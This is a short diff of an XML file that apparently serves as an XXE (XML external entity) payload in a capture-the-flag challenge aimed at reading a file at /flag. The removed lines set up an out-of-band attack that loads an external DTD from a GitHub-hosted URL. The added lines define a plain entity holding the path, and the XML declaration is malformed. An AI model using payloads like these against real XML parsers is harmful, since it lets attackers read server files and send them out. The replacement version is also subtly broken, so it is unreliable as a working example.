@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding-"UTF-8"?>
 <!DOCTYPE foo [
-<!ENTITY % file SYSTEM "file:/flag">
-<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/geoffreychenn/webSecScripts/master/feedifier/feedifier2.xml">
-%dtd
-%file;]>
-<task><name>whatever</name></task>
+<!ENTITY file "file:/flag">
+]>
+
+<foo>&file;</foo>
